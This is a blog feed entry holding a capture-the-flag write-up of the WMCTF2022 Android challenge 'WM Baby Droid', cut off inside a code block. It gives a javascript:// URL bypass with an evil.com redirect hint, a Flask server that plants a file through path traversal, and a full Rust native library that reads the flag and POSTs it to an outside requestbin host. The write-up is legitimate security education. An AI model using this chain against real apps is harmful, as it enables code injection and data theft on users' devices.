<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2022-08-24T03:13:55.851Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Pwn] WMCTF2022 - WM Baby Droid</title>
    <link href="https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/"/>
    <id>https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/</id>
    <published>2022-08-23T01:05:21.345Z</published>
    <updated>2022-08-24T03:13:55.851Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> WM Baby Droid </p></blockquote><blockquote><p><strong>Solves</strong>: 1</p><p><strong>Points</strong>: 500   </p><p><strong>Description</strong>:<br>nc 43.248.96.7 10086</p><p>Attachment:</p><p><a href="https://mega.nz/file/Hm5kCAoY#cLJV96i_oq2xJMiSDJxTQ3Hb8LccUv_vKg6sBiWO5E4" target="_blank" rel="noopener">download</a><br>d9c14779206634d37e7f0e43d5c9537a</p><p><strong>Author</strong>: bubble#2768</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Bypass domain <strong>google.com</strong> verification with <strong>javascript://</strong> to redirect to the evil website.</li><li>App trusts <strong>download_name</strong> so we can use path transversal to save the downloaded library into internal storage.</li><li>Write a native library that will read the flag from the file system and send it through a socket.</li><li>Write the necessary javascript to trigger the <strong>javascriptinterface</strong> and execute our malicious library.</li></ul><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>After downloading the attachment we have the following files:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -l WM_Baby_Droid.zip  </span><br><span class="line">Archive:  WM_Baby_Droid.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">     1978  2022-05-19 10:20   attachment/Dockerfile</span><br><span class="line">  3897305  2022-08-19 10:44   attachment/app-debug.apk</span><br><span class="line">       11  2022-08-19 11:36   attachment/flag</span><br><span class="line">     2333  2022-08-19 10:26   attachment/readme.md</span><br><span class="line">     1022  2022-08-19 10:30   attachment/run.sh</span><br><span class="line">     7848  2022-08-19 10:40   attachment/server.py</span><br><span class="line">      232  2022-04-19 18:58   attachment/server.sh</span><br><span class="line">---------                     -------</span><br><span class="line">  3910729                     7 files</span><br></pre></td></tr></table></figure></p><p>Lets start by analysing the <code>server.py</code>.</p><p>The server will request a poc url from the begining to be sent to the app through an intent:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_to_user(<span class="string">"Please enter your poc url:"</span>)</span><br><span class="line">url = sys.stdin.readline().strip()</span><br><span class="line"><span class="comment"># url should be like "http://xxx" to to ensure that `adb shell` passes intent.data correctly.</span></span><br><span class="line"><span class="keyword">if</span> url.strip(<span class="string">'"'</span>) == url:</span><br><span class="line">    url = <span class="string">f'"<span class="subst">&#123;url&#125;</span>"'</span></span><br><span class="line">...</span><br><span class="line">adb_activity(<span class="string">f"<span class="subst">&#123;VULER&#125;</span>/.MainActivity"</span>, wait=<span class="keyword">True</span>, data=url)</span><br></pre></td></tr></table></figure></p><p>More useful information is given to us when a new emulator with android <code>API_30</code> and <code>x86_64</code> architecture is created:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup_emulator</span><span class="params">()</span>:</span></span><br><span class="line">    subprocess.call(</span><br><span class="line">        <span class="string">"avdmanager"</span> +</span><br><span class="line">        <span class="string">" create avd"</span> +</span><br><span class="line">        <span class="string">" --name 'pixel_xl_api_30'"</span> +</span><br><span class="line">        <span class="string">" --abi 'google_apis/x86_64'"</span> +</span><br><span class="line">        <span class="string">" --package 'system-images;android-30;google_apis;x86_64'"</span> +</span><br><span class="line">        <span class="string">" --device pixel_xl"</span> +</span><br><span class="line">        <span class="string">" --force"</span> +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null"</span>),</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subprocess.Popen(</span><br><span class="line">        <span class="string">"emulator"</span> +</span><br><span class="line">        <span class="string">" -avd pixel_xl_api_30"</span> +</span><br><span class="line">        <span class="string">" -no-cache"</span> +</span><br><span class="line">        <span class="string">" -no-snapstorage"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-save"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot-load"</span> +</span><br><span class="line">        <span class="string">" -no-audio"</span> +</span><br><span class="line">        <span class="string">" -no-window"</span> +</span><br><span class="line">        <span class="string">" -no-snapshot"</span> +</span><br><span class="line">        <span class="string">" -no-boot-anim"</span> +</span><br><span class="line">        <span class="string">" -wipe-data"</span> +</span><br><span class="line">        <span class="string">" -accel on"</span> +</span><br><span class="line">        <span class="string">" -netdelay none"</span> +</span><br><span class="line">        <span class="string">" -no-sim"</span> +</span><br><span class="line">        <span class="string">" -netspeed full"</span> +</span><br><span class="line">        <span class="string">" -delay-adb"</span> +</span><br><span class="line">        <span class="string">" -port &#123;&#125;"</span>.format(EMULATOR_PORT) +</span><br><span class="line">        (<span class="string">""</span> <span class="keyword">if</span> isMacos  <span class="keyword">else</span> <span class="string">" &gt; /dev/null 2&gt; /dev/null "</span>) +</span><br><span class="line">        <span class="string">""</span>,</span><br><span class="line">        env=ENV,</span><br><span class="line">        close_fds=<span class="keyword">True</span>,</span><br><span class="line">        shell=<span class="keyword">True</span>,</span><br><span class="line">        preexec_fn=os.setsid)</span><br><span class="line">...</span><br><span class="line">print_to_user(<span class="string">"Preparing android emulator. This may takes about 2 minutes...\n"</span>)</span><br><span class="line">emulator = setup_emulator()</span><br><span class="line">adb([<span class="string">"wait-for-device"</span>])</span><br></pre></td></tr></table></figure></p><p>We also know from the file that the flag is being broadcasted here:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(FLAG_FILE, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    adb_broadcast(<span class="string">f"com.wmctf.SET_FLAG"</span>, <span class="string">f"<span class="subst">&#123;VULER&#125;</span>/.FlagReceiver"</span>, extras=&#123;<span class="string">"flag"</span>: f.read()&#125;)</span><br></pre></td></tr></table></figure><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>The apk doesn’t have a lot of obfuscation (this was expected since the category of the challenge is pwn and not a reverse).</p><p>We used <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">jadx</a> to analyse the app so lets see what we have in the <strong>AndroidManifest.xml</strong>.</p><p>The application only has the <strong>INTERNET</strong> permission to connect to the internet, a receiver and the main activity:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.MainActivity"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.wmctf.wmbabydroid.FlagReceiver"</span> <span class="attr">android:exported</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>The launcher activity:<br><a data-fancybox="gallery" href="https://i.imgur.com/xRBFwrS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xRBFwrS.png" alt><br></a></p><p>The receiver:<br><a data-fancybox="gallery" href="https://i.imgur.com/x19fanf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/x19fanf.png" alt><br></a></p><p>We don’t have to worry to generate a broadcast since the server will generate one for us (we saw this in the introduction section).</p><h3 id="Bypass-getHost"><a href="#Bypass-getHost" class="headerlink" title="Bypass getHost"></a>Bypass getHost</h3><p>Since there is a verification to allow google.com urls to be loaded:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!uri.getHost().endsWith(<span class="string">".google.com"</span>)) &#123;</span><br></pre></td></tr></table></figure><p>Me and my friend had this great idea of actually hosting our website in <strong>sites.google.com</strong>, we did implement this and the poc was working <strong>locally</strong> unfortunately everything into to the garbage when the organizers told us that <strong>China banned google</strong> so the servers wouldn’t be able to connect to google domains.</p><p>Hearing this we finally realized this was probably a <strong>url parsing</strong> challenge and we tried multiple tricks like the ones mentioned in the <strong>orange blackhat</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">presentation</a> without any success.</p><p>We eventually found this <a href="https://hackerone.com/reports/431002" target="_blank" rel="noopener">CVE</a> about a vulnerability in <strong>getHost</strong> but it looks it only works on <strong>older API versions</strong>,  more recent ones are already patched (We also know from the emulator configuration that the android <strong>API version is 30</strong> so this wouldn’t work).</p><p>We tried to analyse <strong>Android API 30</strong> code trying to find a <strong>flaw</strong> in the code and also checking the URL <strong>RFC</strong> and try new things but without any success.</p><p>We also thought of using an <strong>redirect</strong> to bypass the check  but since the server is hosted in <strong>china</strong> and <strong>google.com</strong> is banned we forgot about this for a while.</p><p>Another idea showed up on trying to use <strong>file://</strong> to access the internal files of the emulator and read the flag, unfortunately to use this requires a special permission in the <strong>webview</strong> so we discarded this option.</p><p>Eventually the organizers published an announcement for this challenge giving the tip to use <strong>javascript://</strong>.</p><p>In the end it was kind of <strong>“simple”</strong> but we didn’t remember of trying <strong>javascript://</strong> which makes sense and it eventually doesn’t even need to request the google domain which is perfect.</p><p>The hint given was:</p><blockquote><p>Baby Droid Hint: JavaScript://<a href="http://www.google.com/%0d%0awindow.location.href=&#39;http://evil.com/&#39;" target="_blank" rel="noopener">www.google.com/%0d%0awindow.location.href=&#39;http://evil.com/&#39;</a></p></blockquote><h3 id="Drop-the-file-into-the-internal-storage-file-directory"><a href="#Drop-the-file-into-the-internal-storage-file-directory" class="headerlink" title="Drop the file into the internal storage file directory"></a>Drop the file into the internal storage file directory</h3><p>The downloaded file is being saved in the external storage cache directory:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String destPath = <span class="keyword">new</span> File(MainActivity.<span class="keyword">this</span>.getExternalCacheDir(), fileName).getPath();</span><br></pre></td></tr></table></figure><p>Because of this we need to find a way to move it to the files directory (shared library will be loaded from that dir):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br></pre></td></tr></table></figure><p>Since the server trusts the <strong>download_name</strong> from the header <strong>Content-Disposition</strong> we can use Path Transversal to save the file to the folder we want. </p><p>The file is saved in <code>/storage/emulated/0/Android/data/com.wmctf.wmbabydroid/cache</code> and we want to move it to <code>/data/data/com.wmctf.wmbabydroid/files/lmao.so</code>.</p><p>To achieve this we used the following <strong>download_name</strong> -&gt; <strong>../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so</strong>.</p><p>We used flask to implement the server in the backend:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(test_config=None)</span>:</span></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    CORS(app, expose_headers=[<span class="string">"Content-Disposition"</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/download')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">()</span>:</span></span><br><span class="line">        response = make_response(send_file(</span><br><span class="line">            <span class="string">"libcargo.so"</span>,</span><br><span class="line">            as_attachment=<span class="keyword">True</span>,</span><br><span class="line">            download_name=<span class="string">"../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so"</span></span><br><span class="line">        ))</span><br><span class="line">        response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so'</span></span><br><span class="line">        response.headers[<span class="string">'User-Agent'</span>] = <span class="string">'kekw'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line">create_app().run(debug=<span class="keyword">True</span>, port=<span class="number">80</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><h3 id="Implement-the-shared-library"><a href="#Implement-the-shared-library" class="headerlink" title="Implement the shared library"></a>Implement the shared library</h3><p>We will have the opportunity to run a <strong>malicious library</strong> in the victim’s device so we need to write a code that will <strong>read the flag</strong> from the file system and send the flag to through a <strong>HTTP request</strong> or a socket using <strong>tcp</strong>.</p><p>Usually an android application has <strong>native</strong> methods that will be called from the native lib like in this example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">getSystemTime</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>In this case we don’t have any, but looking at the documentation it seems when <strong>system.load</strong> is executed a function named <strong>JNI_OnLoad</strong> will be executed:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Loads the native library specified by the &lt;code&gt;libname&lt;/code&gt;</span></span><br><span class="line"><span class="comment">     * argument.  The &lt;code&gt;libname&lt;/code&gt; argument must not contain any platform</span></span><br><span class="line"><span class="comment">     * specific prefix, file extension or path. If a native library</span></span><br><span class="line"><span class="comment">     * called &lt;code&gt;libname&lt;/code&gt; is statically linked with the VM, then the</span></span><br><span class="line"><span class="comment">     * JNI_OnLoad_&lt;code&gt;libname&lt;/code&gt; function exported by the library is invoked.</span></span><br><span class="line"><span class="comment">     * See the JNI Specification for more details.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise, the libname argument is loaded from a system library</span></span><br><span class="line"><span class="comment">     * location and mapped to a native library image in an implementation-</span></span><br><span class="line"><span class="comment">     * dependent manner.</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libname)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The following picture illustrates this well:<br><a data-fancybox="gallery" href="https://i.imgur.com/YJOtQid.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YJOtQid.png" alt><br></a></p><p>I’m not an android developer myself but since I’ve reversed a bunch of <strong>malware</strong> in my work using <strong>rust native libraries</strong> I decided to implement one in rust, since I already had some experience doing it and I thought it wouldn’t be a problem doing it here as well.</p><p>Unfortunately this ended up being an <strong>bad idea</strong> since rust libraries are usually <strong>bigger</strong> than the normal ones and this messed up our final payload (size was about <strong>11mb</strong> but it was enough to disturb the poc in the server).</p><p>For the lulz we will share the rust library we implemented:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::os::raw::&#123;c_char&#125;;</span><br><span class="line"><span class="keyword">use</span> std::ffi::&#123;CString, CStr&#125;;</span><br><span class="line"><span class="keyword">use</span> std::fs;</span><br><span class="line"><span class="keyword">use</span> std::ffi::c_void;</span><br><span class="line"><span class="keyword">use</span> hyper_tls::HttpsConnector;</span><br><span class="line"><span class="keyword">use</span> std::&#123;thread, time&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> log;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> android_log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async <span class="function"><span class="keyword">fn</span> <span class="title">kekw</span></span>() -&gt;  <span class="built_in">Result</span>&lt;(), <span class="built_in">Box</span>&lt;dyn std::error::Error&gt;&gt;&#123;</span><br><span class="line">    <span class="comment">// Create a new client object</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">true</span> &#123; </span><br><span class="line">        <span class="keyword">let</span> b = std::path::Path::new(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>).exists();</span><br><span class="line">        info!(<span class="string">"Stuck in the loop &#123;&#125;"</span>, b);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> https2 = HttpsConnector::new();</span><br><span class="line">        <span class="keyword">let</span> client2 = hyper::Client::builder()</span><br><span class="line">        .build::&lt;_, hyper::Body&gt;(https2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build out our request</span></span><br><span class="line">        <span class="keyword">let</span> req = hyper::Request::builder()</span><br><span class="line">        .method(hyper::Method::POST)</span><br><span class="line">        .uri(<span class="string">"&lt;redacted&gt;"</span>)</span><br><span class="line">        .header(<span class="string">"user-agent"</span>, <span class="string">"WTF"</span>)</span><br><span class="line">        .header(<span class="string">"content-type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        .body(hyper::Body::from(<span class="string">"Stuck waiting for flag"</span>))?;</span><br><span class="line">         <span class="keyword">let</span> resp2 = client2.request(req).await?;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the response body bytes.</span></span><br><span class="line">        <span class="keyword">let</span> body_bytes2 = hyper::body::to_bytes(resp2.into_body()).await?;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert the body bytes to utf-8</span></span><br><span class="line">        <span class="keyword">let</span> body2 = <span class="built_in">String</span>::from_utf8(body_bytes2.to_vec()).unwrap();</span><br><span class="line">        <span class="keyword">if</span> b &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> ten_millis = time::Duration::from_millis(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">let</span> now = time::Instant::now();</span><br><span class="line">        thread::sleep(ten_millis);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//let ten_millis = time::Duration::from_millis(2000);</span></span><br><span class="line">    <span class="comment">//let now = time::Instant::now();</span></span><br><span class="line">    <span class="comment">//thread::sleep(ten_millis);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> https = HttpsConnector::new();</span><br><span class="line">    <span class="keyword">let</span> client = hyper::Client::builder()</span><br><span class="line">    .build::&lt;_, hyper::Body&gt;(https);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//let client = hyper::Client::new();</span></span><br><span class="line">    <span class="keyword">let</span> contents = fs::read_to_string(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)</span><br><span class="line">        .expect(<span class="string">"Should have been able to read the file"</span>);</span><br><span class="line">    info!(<span class="string">"this is a debug &#123;&#125;"</span>, contents);</span><br><span class="line">    <span class="comment">// Build out our request</span></span><br><span class="line">    <span class="keyword">let</span> req = hyper::Request::builder()</span><br><span class="line">        .method(hyper::Method::POST)</span><br><span class="line">        .uri(<span class="string">"https://requestbin.io/wn9ivmwn"</span>)</span><br><span class="line">        .header(<span class="string">"user-agent"</span>, <span class="string">"WTF"</span>)</span><br><span class="line">        .header(<span class="string">"content-type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        .body(hyper::Body::from(contents))?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pass our request builder object to our client.</span></span><br><span class="line">    <span class="keyword">let</span> resp = client.request(req).await?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the response body bytes.</span></span><br><span class="line">    <span class="keyword">let</span> body_bytes = hyper::body::to_bytes(resp.into_body()).await?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert the body bytes to utf-8</span></span><br><span class="line">    <span class="keyword">let</span> body = <span class="built_in">String</span>::from_utf8(body_bytes.to_vec()).unwrap();</span><br><span class="line">    info!(<span class="string">"this is a debug &#123;&#125;"</span>, body);</span><br><span class="line">    <span class="comment">//println!("&#123;&#125;", body);</span></span><br><span class="line">    <span class="literal">Ok</span>(())</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// Expose the JNI interface for android below</span></span><br><span class="line"><span class="meta">#[cfg(target_os=<span class="meta-string">"android"</span>)]</span></span><br><span class="line"><span class="meta">#[allow(non_snake_case)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> android &#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">crate</span> jni;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> super::*;</span><br><span class="line">    <span class="keyword">use</span> self::jni::JNIEnv;</span><br><span class="line">    <span class="keyword">use</span> self::jni::JavaVM;</span><br><span class="line">    <span class="keyword">use</span> self::jni::objects::&#123;JClass, JString&#125;;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::&#123;jstring&#125;;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::JNI_VERSION_1_6;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::&#123;jint, jshort&#125;;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">#[no_mangle]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">extern</span> <span class="string">"system"</span> <span class="function"><span class="keyword">fn</span> <span class="title">JNI_OnLoad</span></span>(_vm: JavaVM, _reserved: *<span class="keyword">mut</span> c_void) -&gt; jint &#123;</span><br><span class="line">        android_logger::init_once(</span><br><span class="line">            android_logger::Config::<span class="keyword">default</span>().with_min_level(log::Level::Trace),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> c_str = <span class="keyword">unsafe</span> &#123;  CStr::from_ptr(CString::new(<span class="string">"kekw feast"</span>).unwrap().as_ptr()) &#125;;</span><br><span class="line">        <span class="keyword">let</span> recipient = <span class="keyword">match</span> c_str.to_str() &#123;</span><br><span class="line">            <span class="literal">Err</span>(_) =&gt; <span class="string">"there"</span>,</span><br><span class="line">            <span class="literal">Ok</span>(string) =&gt; string,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> rt = tokio::runtime::Runtime::new().unwrap();</span><br><span class="line">        <span class="keyword">match</span> rt.block_on(kekw()) &#123;</span><br><span class="line">            <span class="literal">Ok</span>(_) =&gt; info!(<span class="string">"Done"</span>),</span><br><span class="line">            <span class="literal">Err</span>(e) =&gt; error!(<span class="string">"An error ocurred: &#123;&#125;"</span>, e),</span><br><span class="line">        &#125;;</span><br><span class="line">        info!(<span class="string">"kekw"</span>);</span><br><span class="line">        <span class="comment">//CString::new("Hellow ".to_owned() + recipient).unwrap().into_raw();</span></span><br><span class="line">        JNI_VERSION_1_6</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Rust lib was working locally but not in the challenge server so much later we decided to re-implement using “normal” native libraries (file size was reduced to <strong>800kb</strong>):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 